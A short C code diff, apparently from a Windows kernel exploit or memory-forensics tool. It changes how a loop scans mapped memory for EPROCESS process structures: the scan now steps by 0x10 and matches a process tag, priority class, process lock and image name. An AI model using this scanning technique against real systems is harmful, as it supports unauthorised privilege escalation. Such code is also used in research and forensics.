@@ -77,7 +77,7 @@ int main(int argc, char **argv)
 		if (mapped_address != NULL)
 		{
 			// iterate on the currently mapped blob
-			for (UINT64 current_blob_iterator = 0; current_blob_iterator < BUFF_SIZE-50; current_blob_iterator++)
+			for (UINT64 current_blob_iterator = 0; current_blob_iterator < BUFF_SIZE-50; current_blob_iterator = current_blob_iterator + 0x10)
 			{
 				// temporary ptr to currently searched blob
 				BYTE * current_blob_ptr = (BYTE *)(mapped_address + current_blob_iterator);
@@ -86,7 +86,7 @@ int main(int argc, char **argv)
 				if (IsBadReadPtr(current_blob_ptr,4) == 0 && IsBadReadPtr(current_blob_ptr + OFFSET_IMAGEFILENAME, 15) == 0 && IsBadReadPtr(current_blob_ptr + OFFSET_PRIORITYCLASS, 1) == 0)
 				{
 					// setup needles used to search for EPROCESS structure (the more we have the more robust the search will be)
-					UINT32	proc_match_candidate			=	*(UINT32 *)	(current_blob_ptr);
+					UINT32	proc_match_candidate			=	*(UINT32 *)	(current_blob_ptr + OFFSET_PROC_TAG);
 					BYTE	pclass_match_candidate			=	*(BYTE *)	(current_blob_ptr + OFFSET_PRIORITYCLASS);
 					UINT32	processlock_match_candidate		=	*(UINT32 *)	(current_blob_ptr + OFFSET_PROCESSLOCK);
 					CHAR *	imageFileName_candidate			=	(CHAR *)(current_blob_ptr + OFFSET_IMAGEFILENAME);
